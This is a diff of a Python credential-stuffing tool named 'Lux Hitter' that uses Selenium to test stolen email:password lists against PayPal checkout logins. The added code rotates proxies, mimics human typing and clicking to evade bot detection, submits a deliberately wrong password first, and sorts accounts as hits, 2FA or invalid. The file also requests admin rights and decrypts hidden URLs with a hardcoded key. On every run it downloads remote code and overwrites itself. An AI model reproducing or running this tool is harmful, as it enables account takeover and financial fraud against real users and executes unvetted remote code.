@@ -23,14 +23,14 @@ import tempfile
 from cryptography.fernet import Fernet
 import shutil
 
-# Check for admin privileges
+# Verificar permisos de administrador
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
 
-# Run the script as admin
+# Ejecutar el script como administrador
 def run_as_admin():
     if not is_admin():
         print("Requesting administrator privileges...")
@@ -41,27 +41,27 @@ def run_as_admin():
 
 run_as_admin()
 
-# Hardcoded encryption key
+# Clave de encriptación hardcoded
 key = b'hOphMMX5dGxKhP29wlSqxXiclcPsdXRS-UKf_pv0FDw='
 
 cipher = Fernet(key)
 
-# Encrypted URLs and credentials
+# URLs y credenciales encriptadas
 encrypted_version_url = b'gAAAAABmz2RytCfBjLtYP8vOjmxLlWWV9pNzHaUsFouIR3ojlaSJG1HCtgayoGMuP7DYxF5VbUX0963uGnzgd0F3msPhnf_TFrwbDAD0Xi9WLCU7STin8AvadKQc1KwCX-URkwovwDxpxfqyHRSrAjq97IBzT8_HhkjTjt61IXgB173ZhX68spMglSqdoQXkSFJj_mxTIyxEQFJ9F5iEIvPs7YX5z42WFA=='
 encrypted_script_url = b'gAAAAABmz2Ry_TI_y-LvAbXtFYfIWbvGW20vSJ0a95B9E7eHJXn2DqWkqfWV8NOusuLFCek-XoGftrUu05E1SiuBP-F3QBicGMXac2_zLynqdWEhkd4_9AzpKb5PPev82CuR8gjRN6326DjhnpcymmN9PU7j_Sq0NsXv_M4N05953FgfA-jWPqHSj70zJ51PpQ14PGubdTzQORFv6s4VEQTpOy3gNaeLFw=='
 encrypted_cryptolens_token = b'gAAAAABmz2Ry6NwY4pfT-nBwKlXVyZyMDxFYTLuH6XS_doAQdkGCjynR4x4K-Cukt-0J2NS9o-CHEgYpwO8gP3-QXXV-QQx67qsDwySaamtIwZA5X6FAS_fNFzmn4GB_kyIZuF_OxktQIYMUtnEK7ugpvr_e1xt15kBL2CYa5RrPGioMqLH1CZw='
 encrypted_product_id = b'gAAAAABmz2RyZE8MG5RaeVmuemTBNfKyGd_n_1o0L9dMxGaKV0ZoZT4U7pE3jQobsyNS9lsGeqLgc6cfYuro8nWvLm29WTw5LA=='
 
-# Decrypt URLs and credentials
+# Desencriptar URLs y credenciales
 VERSION_URL = cipher.decrypt(encrypted_version_url).decode()
 SCRIPT_URL = cipher.decrypt(encrypted_script_url).decode()
 CRYPTOLENS_TOKEN = cipher.decrypt(encrypted_cryptolens_token).decode()
 PRODUCT_ID = int(cipher.decrypt(encrypted_product_id).decode())
 
 LOCAL_VERSION_FILE = "version.txt"
-LOCAL_SCRIPT_FILE = sys.argv[0]  # Current script file
+LOCAL_SCRIPT_FILE = sys.argv[0]  # Archivo del script actual
 
-# Global variable to track if the script has been updated
+# Variable global para rastrear si el script ha sido actualizado
 script_updated = False
 
 def get_remote_version():
@@ -85,12 +85,12 @@ def update_script():
         response = requests.get(SCRIPT_URL)
         response.raise_for_status()
         
-        # Write to a temp file first
+        # Escribe en un archivo temporal primero
         temp_file = "ReleaseKeyV2_temp.py"
         with open(temp_file, "wb") as file:
             file.write(response.content)
         
-        # Move the temp file to the current script's location
+        # Mueve el archivo temporal al lugar del script actual
         shutil.move(temp_file, LOCAL_SCRIPT_FILE)
         
         print("Script successfully updated.")
@@ -113,7 +113,7 @@ def check_for_updates():
     local_version = get_local_version()
     remote_version = get_remote_version()
 
-    # Download and replace the script regardless of version
+    # Descarga y reemplaza el script independientemente de la versión
     if update_script():
         with open(LOCAL_VERSION_FILE, "w") as file:
             file.write(remote_version or "0.0.0")
@@ -156,6 +156,9 @@ class LuxHitterApp:
         self.original_title = "Lux Hitter"
         self.set_window_title(self.original_title)
 
+    def clear_console(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
+
     def set_window_title(self, title):
         safe_title = f'title "{title.replace("%", "%%").replace(":", "|")}"'
         os.system(safe_title)
@@ -173,7 +176,7 @@ class LuxHitterApp:
 
     def open_file_dialog(self, title="Select a file"):
         root = tk.Tk()
-        root.withdraw()  # Hide the main Tkinter window
+        root.withdraw()  # Ocultar la ventana principal de Tkinter
         file_path = filedialog.askopenfilename(title=title, filetypes=[("Text files", "*.txt")])
         return file_path
 
@@ -317,7 +320,442 @@ class LuxHitterApp:
             if not self.logged_in:
                 input("\033[92mPress Enter to try again...\033[0m")
 
-    # Other functions remain unchanged
+    def hitter_workflow_v1(self):
+        self.clear_console()
+        self.show_ascii_title()
+        self.reset_counters_v1()
+        use_proxies_choice = input("\033[92mDo you want to use proxies? (y/n): \033[0m").strip().lower()
+
+        if use_proxies_choice == 'y':
+            self.use_proxies_v1 = True
+            self.load_proxies_v1()
+
+        self.load_accounts_v1()
+        self.start_hitting_process_v1()
+
+    def hitter_workflow_v2(self):
+        self.clear_console()
+        self.show_ascii_title()
+        self.reset_counters_v2()
+        use_proxies_choice = input("\033[92mDo you want to use proxies? (y/n): \033[0m").strip().lower()
+
+        if use_proxies_choice == 'y':
+            self.use_proxies_v2 = True
+            self.load_proxies_v2()
+
+        self.load_accounts_v2()
+        self.start_hitting_process_v2()
+
+    def load_accounts_v1(self):
+        self.clear_console()
+        self.show_ascii_title()
+        print("\033[92mLoad Accounts (v1)\033[0m")
+        file_path = self.open_file_dialog("Select the accounts file")
+        if file_path:
+            with open(file_path, "r") as file:
+                self.accounts_v1 = [line.strip().split(':') for line in file.readlines()]
+                account_count = len(self.accounts_v1)
+            print(f"\033[92mAccounts loaded successfully. Total accounts: {account_count}\033[0m")
+            time.sleep(1)
+            self.enter_url_v1()
+        else:
+            print("\033[91mFile loading was canceled.\033[0m")
+            input("\033[92mPress Enter to continue...\033[0m")
+
+    def load_accounts_v2(self):
+        self.clear_console()
+        self.show_ascii_title()
+        print("\033[92mLoad Accounts (v2)\033[0m")
+        file_path = self.open_file_dialog("Select the accounts file")
+        if file_path:
+            with open(file_path, "r") as file:
+                self.accounts_v2 = [line.strip().split(':') for line in file.readlines()]
+                account_count = len(self.accounts_v2)
+            print(f"\033[92mAccounts loaded successfully. Total accounts: {account_count}\033[0m")
+            time.sleep(1)
+            self.enter_url_v2()
+        else:
+            print("\033[91mFile loading was canceled.\033[0m")
+            input("\033[92mPress Enter to continue...\033[0m")
+
+    def load_proxies_v1(self):
+        self.clear_console()
+        self.show_ascii_title()
+        print("\033[92mLoad Proxies (v1)\033[0m")
+        file_path = self.open_file_dialog("Select the proxies file")
+        if file_path:
+            with open(file_path, "r") as file:
+                self.proxies_v1 = [line.strip() for line in file.readlines()]
+            print("\033[92mProxies loaded successfully.\033[0m")
+        else:
+            print("\033[91mFile loading was canceled.\033[0m")
+        input("\033[92mPress Enter to continue...\033[0m")
+
+    def load_proxies_v2(self):
+        self.clear_console()
+        self.show_ascii_title()
+        print("\033[92mLoad Proxies (v2)\033[0m")
+        file_path = self.open_file_dialog("Select the proxies file")
+        if file_path:
+            with open(file_path, "r") as file:
+                self.proxies_v2 = [line.strip() for line in file.readlines()]
+            print("\033[92mProxies loaded successfully.\033[0m")
+        else:
+            print("\033[91mFile loading was canceled.\033[0m")
+        input("\033[92mPress Enter to continue...\033[0m")
+
+    def enter_url_v1(self):
+        self.clear_console()
+        self.show_ascii_title()
+        self.url_v1 = input("\033[92mEnter the PayPal Checkout URL (v1): \033[0m").strip()
+        if not self.url_v1:
+            print("\033[91mNo URL has been entered.\033[0m")
+            time.sleep(2)
+            self.enter_url_v1()
+        else:
+            self.start_hitting_process_v1()
+
+    def enter_url_v2(self):
+        self.clear_console()
+        self.show_ascii_title()
+        self.url_v2 = input("\033[92mEnter the PayPal Checkout URL (v2): \033[0m").strip()
+        if not self.url_v2:
+            print("\033[91mNo URL has been entered.\033[0m")
+            time.sleep(2)
+            self.enter_url_v2()
+        else:
+            self.start_hitting_process_v2()
+
+    def start_hitting_process_v1(self):
+        if not self.accounts_v1:
+            print("\033[91mNo accounts have been loaded. Please load accounts first.\033[0m")
+            time.sleep(2)
+            return
+
+        self.start_time_v1 = datetime.now()
+        self.checked_accounts_v1 = 0
+        self.set_window_title(f"Lux Hitting | {len(self.accounts_v1)} Logs Remaining")
+        self.clear_console()
+        self.refresh_thread_v1 = threading.Thread(target=self.print_status_v1, daemon=True)
+        self.refresh_thread_v1.start()
+        self.run_hitter_v1()
+
+    def start_hitting_process_v2(self):
+        if not self.accounts_v2:
+            print("\033[91mNo accounts have been loaded. Please load accounts first.\033[0m")
+            time.sleep(2)
+            return
+
+        self.start_time_v2 = datetime.now()
+        self.checked_accounts_v2 = 0
+        self.set_window_title(f"Lux Hitting | {len(self.accounts_v2)} Logs Remaining")
+        self.clear_console()
+        self.refresh_thread_v2 = threading.Thread(target=self.print_status_v2, daemon=True)
+        self.refresh_thread_v2.start()
+        self.run_hitter_v2()
+
+    def show_hitting_screen_v1(self):
+        self.clear_console()
+        self.show_ascii_title()
+        cpm = self.calculate_cpm_v1()
+        status = (f'CPM: {cpm} | INVALIDs: {self.invalid_count_v1} | 2FAs: {self.twofa_count_v1} | '
+                  f'ERRORs: {self.error_count_v1} | GenericErrors: {self.generic_error_count_v1}')
+        print(f"{status}\n" + "="*40 + "\n")
+        if self.results_v1:
+            print(self.results_v1[-1])
+
+    def show_hitting_screen_v2(self):
+        self.clear_console()
+        self.show_ascii_title()
+        cpm = self.calculate_cpm_v2()
+        status = (f'CPM: {cpm} | INVALIDs: {self.invalid_count_v2} | 2FAs: {self.twofa_count_v2} | '
+                  f'ERRORs: {self.error_count_v2} | GenericErrors: {self.generic_error_count_v2}')
+        print(f"{status}\n" + "="*40 + "\n")
+        if self.results_v2:
+            print(self.results_v2[-1])
+
+    def human_typing_v1(self, element, text):
+        min_delay, max_delay = 0.5, 0.8
+        for char in text:
+            element.send_keys(char)
+            time.sleep(random.uniform(min_delay, max_delay))
+
+    def human_typing_v2(self, element, text):
+        min_delay, max_delay = 0.1, 0.3
+        for char in text:
+            element.send_keys(char)
+            time.sleep(random.uniform(min_delay, max_delay))
+
+    def human_click_v1(self, driver, element):
+        min_delay, max_delay = 1.0, 1.5
+        actions = ActionChains(driver)
+        actions.move_to_element(element).pause(random.uniform(min_delay, max_delay)).click().perform()
+
+    def human_click_v2(self, driver, element):
+        min_delay, max_delay = 0.3, 0.7
+        actions = ActionChains(driver)
+        actions.move_to_element(element).pause(random.uniform(min_delay, max_delay)).click().perform()
+
+    def run_hitter_v1(self):
+        sys.stderr = open(os.devnull, 'w')
+
+        for i, (email, password) in enumerate(self.accounts_v1):
+            proxy = self.proxies_v1[i] if self.use_proxies_v1 and self.proxies_v1 else None
+            driver = self.create_new_browser(proxy)
+
+            try:
+                result = f"\033[94mTrying: {email} (1st password - incorrect)\033[0m"
+                self.results_v1.append(result)
+                self.update_status_v1()
+
+                driver.get(self.url_v1)
+                time.sleep(2.5)
+
+                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "email")))
+                email_input = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, "email")))
+                self.human_typing_v1(email_input, email)
+                time.sleep(2.5)
+
+                next_button = driver.find_element(By.ID, "btnNext")
+                self.human_click_v1(driver, next_button)
+                time.sleep(2.5)
+
+                password_input = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, "password")))
+
+                incorrect_password = password[:-1] + random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
+                print(f"\033[93mFirst attempt with incorrect password: {incorrect_password}\033[0m")
+                self.human_typing_v1(password_input, incorrect_password)
+                time.sleep(2.5)
+
+                login_button = driver.find_element(By.ID, "btnLogin")
+                self.human_click_v1(driver, login_button)
+                time.sleep(3)
+
+                password_input = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, "password")))
+                password_input.clear()
+                result = f"\033[94mTrying: {email} (2nd password - correct)\033[0m"
+                self.results_v1.append(result)
+                self.update_status_v1()
+                self.human_typing_v1(password_input, password)
+                time.sleep(2.5)
+
+                login_button = driver.find_element(By.ID, "btnLogin")
+                self.human_click_v1(driver, login_button)
+                time.sleep(3)
+
+                start_hermes_time = time.time()
+                while True:
+                    current_url = driver.current_url
+                    if "paypal.com/webapps/hermes" in current_url:
+                        if time.time() - start_hermes_time > 6:
+                            self.handle_hitted_v1(driver, email)
+                            break
+                    elif "paypal.com/authflow/entry" in current_url or "generic" in current_url:
+                        result = f"\033[93m2FA or Redirect: {email}\033[0m"
+                        self.twofa_count_v1 += 1
+                        break
+                    else:
+                        result = f"\033[91mInvalid: {email}\033[0m"
+                        self.invalid_count_v1 += 1
+                        break
+
+                self.results_v1.append(result)
+                self.checked_accounts_v1 += 1
+                self.set_window_title(f"Lux Hitting | {len(self.accounts_v1) - self.checked_accounts_v1} Logs Remaining")
+
+            except Exception as e:
+                result = f"\033[91mError: {email}\033[0m"
+                self.error_count_v1 += 1
+                self.results_v1.append(result)
+
+            finally:
+                driver.quit()
+
+        self.handle_hitting_complete_v1()
+
+    def run_hitter_v2(self):
+        sys.stderr = open(os.devnull, 'w')
+
+        for i, (email, password) in enumerate(self.accounts_v2):
+            proxy = self.proxies_v2[i] if self.use_proxies_v2 and self.proxies_v2 else None
+            driver = self.create_new_browser(proxy)
+
+            try:
+                result = f"\033[94mTrying: {email} (1st password - incorrect)\033[0m"
+                self.results_v2.append(result)
+                self.update_status_v2()
+
+                driver.get(self.url_v2)
+                time.sleep(1.0)
+
+                WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.ID, "email")))
+                email_input = WebDriverWait(driver, 2).until(EC.element_to_be_clickable((By.ID, "email")))
+                self.human_typing_v2(email_input, email)
+                time.sleep(1.0)
+
+                next_button = driver.find_element(By.ID, "btnNext")
+                self.human_click_v2(driver, next_button)
+                time.sleep(1.0)
+
+                password_input = WebDriverWait(driver, 2).until(EC.element_to_be_clickable((By.ID, "password")))
+
+                incorrect_password = password[:-1] + random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
+                print(f"\033[93mFirst attempt with incorrect password: {incorrect_password}\033[0m")
+                self.human_typing_v2(password_input, incorrect_password)
+                time.sleep(1.0)
+
+                login_button = driver.find_element(By.ID, "btnLogin")
+                self.human_click_v2(driver, login_button)
+                time.sleep(1.5)
+
+                password_input = WebDriverWait(driver, 2).until(EC.element_to_be_clickable((By.ID, "password")))
+                password_input.clear()
+                result = f"\033[94mTrying: {email} (2nd password - correct)\033[0m"
+                self.results_v2.append(result)
+                self.update_status_v2()
+                self.human_typing_v2(password_input, password)
+                time.sleep(1.0)
+
+                login_button = driver.find_element(By.ID, "btnLogin")
+                self.human_click_v2(driver, login_button)
+                time.sleep(1.5)
+
+                start_hermes_time = time.time()
+                while True:
+                    current_url = driver.current_url
+                    if "paypal.com/webapps/hermes" in current_url:
+                        if time.time() - start_hermes_time > 6:
+                            self.handle_hitted_v2(driver, email)
+                            break
+                    elif "paypal.com/authflow/entry" in current_url or "generic" in current_url:
+                        result = f"\033[93m2FA or Redirect: {email}\033[0m"
+                        self.twofa_count_v2 += 1
+                        break
+                    else:
+                        result = f"\033[91mInvalid: {email}\033[0m"
+                        self.invalid_count_v2 += 1
+                        break
+
+                self.results_v2.append(result)
+                self.checked_accounts_v2 += 1
+                self.set_window_title(f"Lux Hitting | {len(self.accounts_v2) - self.checked_accounts_v2} Logs Remaining")
+
+            except Exception as e:
+                result = f"\033[91mError: {email}\033[0m"
+                self.error_count_v2 += 1
+                self.results_v2.append(result)
+
+            finally:
+                driver.quit()
+
+        self.handle_hitting_complete_v2()
+
+    def handle_hitting_complete_v1(self):
+        print("\033[92mAll accounts processed in v1. Returning to the main menu...\033[0m")
+        self.cleanup_v1()
+        time.sleep(4)
+        self.show_main_menu()
+
+    def handle_hitting_complete_v2(self):
+        print("\033[92mAll accounts processed in v2. Returning to the main menu...\033[0m")
+        self.cleanup_v2()
+        time.sleep(4)
+        self.show_main_menu()
+
+    def cleanup_v1(self):
+        """Cleanup after v1 hitting is complete."""
+        self.refresh_thread_v1 = None
+        self.reset_counters_v1()
+        self.restore_window_title()
+        self.accounts_v1 = []
+
+    def cleanup_v2(self):
+        """Cleanup after v2 hitting is complete."""
+        self.refresh_thread_v2 = None
+        self.reset_counters_v2()
+        self.restore_window_title()
+        self.accounts_v2 = []
+
+    def handle_hitted_v1(self, driver, email):
+        self.refresh_thread_v1 = None
+        self.clear_console()
+        self.show_ascii_title()
+        print(f"\033[92mHit: {email}\033[0m")
+        print("\nHitted, what now?\n")
+        print("1. CLOSE BROWSER AND RETURN TO MENU")
+        print("2. CONTINUE TRYING WITH REST OF LOGS")
+
+        choice = input("\033[92mSelect an option: (1 or 2): \033[0m").strip()
+
+        if choice == '1':
+            self.cleanup_v1()
+            driver.quit()
+            self.show_main_menu()
+        elif choice == '2':
+            driver.quit()
+            self.refresh_thread_v1 = threading.Thread(target=self.print_status_v1, daemon=True)
+            self.refresh_thread_v1.start()
+
+    def handle_hitted_v2(self, driver, email):
+        self.refresh_thread_v2 = None
+        self.clear_console()
+        self.show_ascii_title()
+        print(f"\033[92mHit: {email}\033[0m")
+        print("\nHitted, what now?\n")
+        print("1. CLOSE BROWSER AND RETURN TO MENU")
+        print("2. CONTINUE TRYING WITH REST OF LOGS")
+
+        choice = input("\033[92mSelect an option: (1 or 2): \033[0m").strip()
+
+        if choice == '1':
+            self.cleanup_v2()
+            driver.quit()
+            self.show_main_menu()
+        elif choice == '2':
+            driver.quit()
+            self.refresh_thread_v2 = threading.Thread(target=self.print_status_v2, daemon=True)
+            self.refresh_thread_v2.start()
+
+    def restore_window_title(self):
+        self.set_window_title(self.original_title)
+
+    def create_new_browser(self, proxy):
+        chrome_options = Options()
+        chrome_options.add_argument('--disable-popup-blocking')
+        chrome_options.add_argument('--disable-infobars')
+        chrome_options.add_argument('--disable-notifications')
+        chrome_options.add_argument('--start-maximized')
+        chrome_options.add_argument('--incognito')
+
+        if proxy:
+            chrome_options.add_argument(f'--proxy-server=http://{proxy}')
+
+        return webdriver.Chrome(options=chrome_options)
+
+    def clear_console(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
+
+    def print_main_menu(self):
+        print("\033[92m1. Hitter (v1)\033[0m")
+        print("\033[92m2. Hitter v2 - (Less Hitrate)\033[0m")
+        print("\033[92m3. Exit\033[0m")
+        print("="*40)
+        print()
+
+    def show_main_menu(self):
+        self.clear_console()
+        self.show_ascii_title()
+        self.print_main_menu()
+
+    def print_status_v1(self):
+        while self.refresh_thread_v1 is not None:
+            self.update_status_v1()
+            time.sleep(0.5)
+
+    def print_status_v2(self):
+        while self.refresh_thread_v2 is not None:
+            self.update_status_v2()
+            time.sleep(0.5)
 
 if __name__ == "__main__":
     try:
